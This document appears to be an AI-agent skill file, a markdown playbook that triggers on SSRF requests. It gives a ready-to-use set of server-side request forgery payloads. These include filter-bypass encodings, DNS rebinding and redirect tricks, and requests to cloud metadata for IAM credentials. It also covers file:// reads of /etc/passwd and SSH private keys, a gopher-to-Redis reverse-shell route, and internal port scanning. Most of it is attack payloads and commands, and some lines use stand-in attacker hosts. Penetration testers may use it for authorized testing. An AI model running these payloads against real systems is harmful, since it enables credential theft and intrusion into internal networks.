---
name: ssrf-poc
description: Detect and exploit SSRF vulnerabilities using OOB interaction detection with interactsh and manual bypass techniques. Use when testing for server-side request forgery, accessing cloud metadata, probing internal services, or validating SSRF with out-of-band callbacks.
tags:
  - security
  - ssrf
  - server-side-request-forgery
  - oob
  - internal
triggers:
  - ssrf
  - server side request forgery
  - ssrf exploit
  - internal request
  - oob interaction
---

# ssrf-poc

## When to Use

- User requests SSRF testing or server-side request forgery detection
- Testing URL/webhook input fields for internal service access
- Accessing cloud metadata services (AWS/GCP/Azure)
- Probing internal network through application requests
- Setting up OOB (out-of-band) callbacks for blind SSRF
- Bypassing SSRF filters with encoding or redirect techniques
- Testing file:// or gopher:// scheme exploitation
- Validating SSRF findings with proof of concept

## Quick Start

```bash
# Generate OOB payload
interactsh-client

# Use the generated domain in SSRF payloads
# Example: https://target.com/fetch?url=http://PAYLOAD.oast.pro

# Basic localhost access
http://127.0.0.1/admin
http://localhost:8080/
http://0.0.0.0:22

# Cloud metadata
http://169.254.169.254/latest/meta-data/
```

## Interactsh Setup

### Generate OOB Payload

```bash
# Start client (auto-generates unique domain)
interactsh-client

# Output:
# [INF] c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro
```

### Monitor Interactions

```bash
# Verbose mode with logging
interactsh-client -v -o ssrf-interactions.txt

# JSON output
interactsh-client -json -o results.json

# Filter by protocol
interactsh-client -http-only
interactsh-client -dns-only
```

### Session Persistence

```bash
# Resume same session later
interactsh-client -sf ssrf-session.session
```

### Custom Server

```bash
# Use specific server
interactsh-client -server oast.pro

# Self-hosted server
interactsh-client -server your-server.com -token YOUR_TOKEN
```

## Step-by-Step Process

### 1. Generate OOB Payload

```bash
interactsh-client
# Note the generated domain: xyz123.oast.pro
```

### 2. Identify SSRF Injection Points

Common parameters: `url`, `path`, `src`, `href`, `redirect`, `uri`, `callback`, `webhook`, `proxy`, `target`, `fetch`, `load`, `data`, `file`

### 3. Test Basic SSRF

```bash
# Inject OOB domain
https://target.com/api?url=http://xyz123.oast.pro

# Check interactsh for callback
# [xyz123] Received HTTP interaction from TARGET_IP
```

### 4. Escalate with Bypass Techniques

If basic payload blocked, try bypass techniques (see below).

### 5. Extract Sensitive Data

```bash
# Cloud metadata
https://target.com/api?url=http://169.254.169.254/latest/meta-data/

# Internal services
https://target.com/api?url=http://localhost:8080/admin
```

## Bypass Techniques

### IPv6 Notation

```
http://[::]:80/
http://[0000::1]:80/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

### Localhost Variations

```
http://127.0.0.1
http://localhost
http://127.1
http://127.0.1
http://0.0.0.0
http://0/
http://127.127.127.127
```

### Domain Redirect Services

```
http://localtest.me              → ::1
http://127.0.0.1.nip.io          → 127.0.0.1
http://company.127.0.0.1.nip.io  → 127.0.0.1
http://spoofed.BURP_COLLAB       → 127.0.0.1
```

### IP Encoding

```
# Decimal
http://2130706433/        → 127.0.0.1
http://2852039166/        → 169.254.169.254

# Hexadecimal
http://0x7f000001/        → 127.0.0.1
http://0xa9fea9fe/        → 169.254.169.254

# Octal
http://0177.0.0.1/        → 127.0.0.1
```

### URL Encoding

```
http://127.0.0.1/%61dmin       (single encode)
http://127.0.0.1/%2561dmin     (double encode)
http://127%2e0%2e0%2e1/        (encoded dots)
```

### DNS Rebinding

```bash
# Using 1u.ms service
# Rotates between two IPs

make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms

# Verify rotation
nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

### Redirect Bypass

```bash
# Using r3dir.me service
https://307.r3dir.me/--to/?url=http://localhost
https://ENCODED.302.r3dir.me → http://169.254.169.254/
```

### URL Parser Exploitation

```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
```

## Cloud Metadata Targets

| Provider     | Endpoint                                                   | Notes                                     |
| ------------ | ---------------------------------------------------------- | ----------------------------------------- |
| AWS EC2      | `169.254.169.254/latest/meta-data/`                        | IAM creds at `/iam/security-credentials/` |
| GCP          | `metadata.google.internal/computeMetadata/v1/`             | Requires `Metadata-Flavor: Google` header |
| Azure        | `169.254.169.254/metadata/instance?api-version=2021-02-01` | Requires `Metadata: true` header          |
| DigitalOcean | `169.254.169.254/metadata/v1/`                             | No auth required                          |
| Alibaba      | `100.100.100.200/latest/meta-data/`                        | Similar to AWS                            |

## URL Schemes

| Scheme      | Purpose             | Example                         |
| ----------- | ------------------- | ------------------------------- |
| `file://`   | Read local files    | `file:///etc/passwd`            |
| `gopher://` | TCP data injection  | `gopher://localhost:6379/_INFO` |
| `dict://`   | Dictionary protocol | `dict://localhost:6379/INFO`    |
| `ldap://`   | Directory access    | `ldap://localhost:389/`         |
| `sftp://`   | File transfer       | `sftp://attacker:22/`           |

## Examples

### Example 1: Basic OOB Detection

**Scenario:** Test URL parameter for blind SSRF

**Setup:**

```bash
interactsh-client
# [INF] abc123xyz.oast.pro
```

**Payload:**

```
https://target.com/webhook?url=http://abc123xyz.oast.pro
```

**Detection:**

```
[abc123xyz] Received HTTP interaction from 52.14.23.45 at 2024-01-15 10:30
```

### Example 2: AWS Metadata Extraction

**Scenario:** Access EC2 instance credentials via SSRF

**Payload:**

```
https://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Response:**

```
my-iam-role
```

**Follow-up:**

```
https://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-iam-role
```

### Example 3: IPv6 Bypass

**Scenario:** localhost blocked, try IPv6

**Blocked:**

```
https://target.com/fetch?url=http://localhost:8080/admin
# Error: localhost not allowed
```

**Bypass:**

```
https://target.com/fetch?url=http://[::]:8080/admin
https://target.com/fetch?url=http://[0000::1]:8080/admin
```

### Example 4: Decimal IP Bypass

**Scenario:** IP addresses blocked

**Blocked:**

```
https://target.com/fetch?url=http://127.0.0.1/admin
```

**Bypass:**

```
https://target.com/fetch?url=http://2130706433/admin
```

### Example 5: DNS Rebinding

**Scenario:** Application validates DNS then fetches

**Payload:**

```
https://target.com/fetch?url=http://make-8.8.8.8-rebind-127.0.0.1-rr.1u.ms/admin
```

First lookup returns 8.8.8.8 (passes validation), second returns 127.0.0.1.

### Example 6: Internal Port Scanning

**Scenario:** Discover internal services

**Command:**

```bash
# Generate URLs for port scan
for port in 22 80 443 3306 5432 6379 8080 9200; do
  echo "http://127.0.0.1:$port/"
done > ports.txt

# Test each via SSRF endpoint
```

**Response Analysis:**

- Different response time = port open
- Connection refused = port closed
- Different response size = service detected

### Example 7: Redirect Service Bypass

**Scenario:** External URLs only allowed

**Payload:**

```
https://target.com/fetch?url=https://307.r3dir.me/--to/?url=http://localhost:8080/admin
```

Server follows redirect to internal resource.

### Example 8: File Protocol

**Scenario:** file:// scheme supported

**Payloads:**

```
https://target.com/pdf?url=file:///etc/passwd
https://target.com/pdf?url=file:///proc/self/environ
https://target.com/pdf?url=file:///home/user/.ssh/id_rsa
```

### Example 9: Gopher Protocol Exploitation

**Scenario:** Exploit Redis via gopher

**Generate Payload:**

```bash
gopherus --exploit redis
# Enter: reverse shell command
```

**Use Generated Payload:**

```
https://target.com/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a...
```

### Example 10: Webhook SSRF

**Scenario:** Test webhook callback functionality

**Setup:**

```bash
interactsh-client -v
# [INF] webhook123.oast.pro
```

**Configure Webhook:**

```json
{
  "callback_url": "http://webhook123.oast.pro/notify",
  "events": ["order.created"]
}
```

**Verify Callback:**

```
[webhook123] Received HTTP interaction
POST /notify HTTP/1.1
Host: webhook123.oast.pro
Content-Type: application/json
```

### Example 11: SSRF via Image URL

**Scenario:** Profile image URL vulnerable

**Payload:**

```
https://target.com/profile/update
POST: avatar_url=http://169.254.169.254/latest/meta-data/
```

**If image rendered:** Check for metadata in response
**If blind:** Use OOB callback

### Example 12: URL Parser Confusion

**Scenario:** Different libraries parse URLs differently

**Payloads:**

```
http://evil.com#@target-internal.local/admin
http://evil.com\@target-internal.local/admin
http://target-internal.local:80\@evil.com/
```

## Error Handling

| Error                     | Cause                | Resolution                      |
| ------------------------- | -------------------- | ------------------------------- |
| `Connection refused`      | Target port closed   | Try different ports             |
| `Connection timeout`      | Firewall blocking    | Try bypass techniques           |
| `Invalid URL`             | URL validation       | Use encoding/redirect bypass    |
| `Host not allowed`        | Allowlist validation | Try DNS rebinding or redirect   |
| `No interaction received` | Request not made     | Check if request reaches server |
| `Protocol not supported`  | Scheme blocked       | Try different protocols         |

## Interactsh Command Reference

| Flag                 | Description                     |
| -------------------- | ------------------------------- |
| `-s, -server`        | Interactsh server(s) to use     |
| `-n, -number`        | Number of payloads to generate  |
| `-t, -token`         | Auth token for protected server |
| `-sf, -session-file` | Resume from session file        |
| `-o`                 | Output file                     |
| `-json`              | JSON output format              |
| `-v`                 | Verbose output                  |
| `-dns-only`          | Show only DNS interactions      |
| `-http-only`         | Show only HTTP interactions     |
| `-smtp-only`         | Show only SMTP interactions     |

## Public Interactsh Servers

| Server      | Status  |
| ----------- | ------- |
| oast.pro    | Default |
| oast.live   | Backup  |
| oast.site   | Backup  |
| oast.online | Backup  |
| oast.fun    | Backup  |

## SSRF Checklist

1. **Identify Input Points** - URL params, headers, webhooks
2. **Setup OOB Detection** - interactsh callback
3. **Test Basic SSRF** - localhost, 127.0.0.1
4. **Try Bypass Techniques** - encoding, redirect, DNS rebinding
5. **Target Cloud Metadata** - AWS/GCP/Azure endpoints
6. **Test URL Schemes** - file://, gopher://, dict://
7. **Port Scan Internal** - Common service ports

## Best Practices

1. **Always Use OOB** - Blind SSRF common, use interactsh
2. **Try Multiple Bypasses** - Encoding, redirect, rebinding
3. **Check All Protocols** - HTTP, HTTPS, file, gopher
4. **Target Metadata First** - Quick wins on cloud targets
5. **Document Response Differences** - Timing, size, content
6. **Chain with Other Vulns** - SSRF → RCE via Redis/Memcache

## References

- [Interactsh GitHub](https://github.com/projectdiscovery/interactsh)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [AWS IMDS Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
